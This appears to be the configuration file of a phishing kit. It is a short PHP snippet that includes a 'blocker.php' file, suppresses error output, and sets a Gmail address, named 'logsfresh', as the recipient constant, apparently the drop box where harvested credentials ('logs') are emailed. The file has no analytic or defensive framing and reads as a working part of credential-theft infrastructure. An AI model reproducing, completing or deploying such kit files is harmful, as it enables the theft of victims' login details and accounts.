<?php
include('blocker.php');
error_reporting(0);
$ur_email   = "logsfresh@gmail.com,logsfresh@gmail.com
";
define("EMAIL", "$ur_email");
?>